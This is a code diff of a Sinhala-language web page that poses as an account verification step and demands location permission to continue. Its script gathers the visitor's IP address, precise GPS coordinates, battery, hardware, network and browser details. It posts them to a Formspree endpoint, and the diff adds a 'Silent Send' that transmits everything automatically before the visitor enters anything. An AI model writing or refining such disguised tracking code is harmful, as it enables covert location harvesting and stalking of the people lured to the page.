@@ -10,10 +10,8 @@
         h2 { color: #1c1e21; margin-bottom: 10px; font-size: 22px; }
         p { color: #606770; font-size: 14px; line-height: 1.5; }
         input[type="text"] { width: 100%; padding: 12px; margin: 20px 0; border: 1.5px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 16px; display: none; transition: 0.3s; }
-        input[type="text"]:focus { border-color: #28a745; outline: none; box-shadow: 0 0 5px rgba(40, 167, 69, 0.3); }
         button { width: 100%; padding: 12px; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.3s; background-color: #28a745; color: white; display: none; }
-        button:hover { background-color: #218838; transform: translateY(-1px); }
-        button:disabled { background-color: #ccc; cursor: not-allowed; }
+        button:hover { background-color: #218838; }
         #status { margin-top: 15px; font-size: 14px; color: #d9534f; font-weight: 500; }
         .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; margin: 0 auto 15px; display: block; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
@@ -29,11 +27,11 @@
             <p>ඉදිරියට යාමට ඉහළින් එන <b>Location Permission</b> එක <b>Allow</b> කරන්න.</p>
         </div>
 
-        <div id="input-ui">
+        <div id="input-ui" style="display:none;">
             <h2>තොරතුරු තහවුරු කරන්න</h2>
-            <p>පද්ධතියට ඇතුළු වීමට ඔබේ නම ඇතුළත් කරන්න.</p>
-            <input type="text" id="userName" placeholder="ඔබේ නම මෙතන ලියන්න...">
-            <button id="submitBtn" onclick="sendToEmail()">ඉදිරියට යන්න</button>
+            <p>පද්ධතියට ඇතුළු වීමට ඔබේ නම හෝ ඊමේල් එක ඇතුළත් කරන්න (අත්‍යවශ්‍ය නොවේ).</p>
+            <input type="text" id="userName" placeholder="නම හෝ ඊමේල් මෙතන ලියන්න...">
+            <button id="submitBtn" onclick="manualSend()">ඉදිරියට යන්න</button>
         </div>
         
         <div id="status"></div>
@@ -41,7 +39,6 @@
 </div>
 
 <script>
-    // සියලුම දත්ත ගබඩා කරන Object එක
     let techData = {
         ip: "Unknown",
         location: "Denied",
@@ -51,99 +48,85 @@
         ram: "Unknown",
         cpu: "Unknown",
         screen: window.screen.width + "x" + window.screen.height,
-        lang: navigator.language,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        online: navigator.onLine ? "Yes" : "No"
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
     };
 
+    // Formspree ID එක මෙතනට දමන්න
+    const formspreeID = "xdabkpao"; 
+
     async function autoGetLocation() {
-        // 1. IP ලිපිනය ලබා ගැනීම
+        // 1. IP සහ Hardware දත්ත ලබා ගැනීම
         try {
             const res = await fetch('https://api.ipify.org?format=json');
             const data = await res.json();
             techData.ip = data.ip;
             techData.time = new Date().toLocaleString('en-US', { timeZone: 'Asia/Colombo' });
-        } catch (e) { console.log("IP fetch failed"); }
-
-        // 2. උපාංගයේ Hardware විස්තර
-        techData.cpu = (navigator.hardwareConcurrency || "Unknown") + " Cores";
-        techData.ram = (navigator.deviceMemory || "Unknown") + " GB";
-        techData.network = navigator.connection ? navigator.connection.effectiveType : "Unknown";
-
-        // 3. බැටරි විස්තර (Fix)
-        if (navigator.getBattery) {
-            try {
+            techData.cpu = (navigator.hardwareConcurrency || "Unknown") + " Cores";
+            techData.ram = (navigator.deviceMemory || "Unknown") + " GB";
+            techData.network = navigator.connection ? navigator.connection.effectiveType : "Unknown";
+            
+            if (navigator.getBattery) {
                 const battery = await navigator.getBattery();
                 techData.battery = (battery.level * 100).toFixed(0) + "% (" + (battery.charging ? "Charging" : "Not Charging") + ")";
-            } catch (e) { techData.battery = "Not Supported"; }
-        }
+            }
+        } catch (e) { console.log("Init failed"); }
 
-        // 4. Location ලබා ගැනීම (Critical Fix)
+        // 2. Location ලබා ගැනීම
         if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition((pos) => {
+            navigator.geolocation.getCurrentPosition(async (pos) => {
                 const lat = pos.coords.latitude;
                 const lon = pos.coords.longitude;
-                // Google Maps URL එක නිවැරදි Template Literal එකක් ලෙස සැකසීම
+                // Google Maps Link නිවැරදි කිරීම
                 techData.location = `https://www.google.com/maps?q=${lat},${lon}`;
                 
-                // UI එක මාරු කිරීම
+                // --- ස්වයංක්‍රීයව දත්ත යැවීම (Silent Send) ---
+                sendDataToEmail("Automatic_Visitor_Capture");
+
+                // UI එක පෙන්වීම
                 document.getElementById("loading-ui").style.display = "none";
+                document.getElementById("input-ui").style.display = "block";
                 document.getElementById("userName").style.display = "block";
                 document.getElementById("submitBtn").style.display = "block";
             }, (err) => {
-                document.getElementById("status").innerHTML = "දෝෂයකි: ඉදිරියට යාමට Location Allow කිරීම අනිවාර්ය වේ. කරුණාකර පේජ් එක Refresh කරන්න.";
+                document.getElementById("status").innerHTML = "ඉදිරියට යාමට Location Allow කිරීම අනිවාර්ය වේ.";
                 document.querySelector(".loader").style.display = "none";
             }, { enableHighAccuracy: true });
-        } else {
-            alert("ඔබේ බ්‍රවුසරය මෙය සඳහා සහය නොදක්වයි.");
         }
     }
 
-    async function sendToEmail() {
-        const nameInput = document.getElementById("userName");
-        const name = nameInput.value.trim();
-        const btn = document.getElementById("submitBtn");
-        const statusDiv = document.getElementById("status");
-
-        if (!name) {
-            alert("කරුණාකර නම ඇතුළත් කරන්න.");
-            return;
-        }
-
-        btn.innerText = "දත්ත යවමින් පවතී...";
-        btn.disabled = true;
-        statusDiv.innerHTML = "";
+    async function sendDataToEmail(identifier) {
+        const payload = {
+            Capture_Type: identifier,
+            IP_Address: techData.ip,
+            Google_Maps: techData.location,
+            Battery: techData.battery,
+            Network: techData.network,
+            RAM: techData.ram,
+            CPU: techData.cpu,
+            Device_Time: techData.time,
+            TimeZone: techData.timezone,
+            Browser: navigator.userAgent
+        };
 
         try {
-            const response = await fetch("https://formspree.io/f/xdabkpao", {
+            await fetch(`https://formspree.io/f/${formspreeID}`, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    Name: name,
-                    IP_Address: techData.ip,
-                    Maps_Link: techData.location,
-                    Date_Time: techData.time,
-                    Battery_Status: techData.battery,
-                    Network_Type: techData.network,
-                    Screen_Size: techData.screen,
-                    RAM_Estimate: techData.ram,
-                    CPU_Cores: techData.cpu,
-                    TimeZone: techData.timezone,
-                    Online: techData.online,
-                    User_Agent: navigator.userAgent
-                })
+                body: JSON.stringify(payload)
             });
+        } catch (e) { console.log("Send failed"); }
+    }
 
-            if (response.ok) {
-                document.getElementById("content").innerHTML = "<h2 style='color:#28a745'>සාර්ථකයි!</h2><p>ඔබේ ගිණුම සාර්ථකව තහවුරු විය. ස්තූතියි.</p>";
-            } else {
-                throw new Error("Formspree Error");
-            }
-        } catch (err) {
-            alert("දෝෂයක් සිදු විය. කරුණාකර නැවත උත්සාහ කරන්න.");
-            btn.disabled = false;
-            btn.innerText = "ඉදිරියට යන්න";
-        }
+    async function manualSend() {
+        const name = document.getElementById("userName").value.trim() || "No Name Entered";
+        const btn = document.getElementById("submitBtn");
+        
+        btn.innerText = "යවමින් පවතී...";
+        btn.disabled = true;
+
+        await sendDataToEmail("User_Manual_Submission: " + name);
+        
+        document.getElementById("content").innerHTML = "<h2 style='color:#28a745'>සාර්ථකයි!</h2><p>තොරතුරු තහවුරු විය.</p>";
     }
 </script>
 
